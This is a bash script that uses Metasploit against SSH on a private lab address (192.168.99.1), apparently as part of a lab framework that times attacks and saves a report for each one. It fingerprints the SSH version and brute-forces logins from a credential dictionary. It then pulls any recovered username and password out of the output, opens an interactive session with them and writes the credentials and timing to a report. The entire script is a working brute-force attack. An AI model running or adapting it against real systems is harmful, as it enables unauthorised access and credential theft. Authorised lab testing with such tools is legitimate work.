!/bin/bash -x

# variables
username=""
password=""
ssh_version=""

# Find OpenSSH version
sudo service postgresql start
sudo msfdb init
msfconsole -x "\
        db_nmap -Pn -p 22 192.168.99.1;\
        use auxiliary/scanner/ssh/ssh_version;\
        set RHOSTS 192.168.99.1;\
        run;\
        exit -y"  > tmp.txt

ssh_version=$(grep "192.168.99.1:22" tmp.txt | awk -F 'SSH server version: ' '{print $2}' | awk -F ' ' '{print $1}')

# Get the start time
start_time=$(date +%s.%N)

# Perform brute force ssh attack
msfconsole -x "\
        use auxiliary/scanner/ssh/ssh_login;\
        set RHOSTS 192.168.99.1;\
        set STOP_ON_SUCCESS true;\
        set USERPASS_FILE ./dictionaries/ssh-list.txt;\
        run;\
        exit -y"  > tmp.txt
        
# Get the end time
end_time=$(date +%s.%N)

# Calculate the difference in seconds
duration=$(echo "$end_time - $start_time" | bc)

username=$(grep "192.168.99.1:22 - Success:" ./tmp.txt | awk -F "'" '{print $2}' | awk -F ':' '{print $1}')
password=$(grep "192.168.99.1:22 - Success:" ./tmp.txt | awk -F "'" '{print $2}' | awk -F ':' '{print $2}')

# Open a session
msfconsole -x "\
        use auxiliary/scanner/ssh/ssh_login;\
        set RHOSTS 192.168.99.1;\
        set USERNAME "$username";\
        set PASSWORD "$password";\
        run;\
        sessions -i 1;\
        exit -y"

# Print the values of the variables to a file
echo "$username" > ./attacks/ssh/ssh_report.txt
echo "$password" >> ./attacks/ssh/ssh_report.txt
echo "$ssh_version" >> ./attacks/ssh/ssh_report.txt
echo "$duration" >> ./attacks/ssh/ssh_report.txt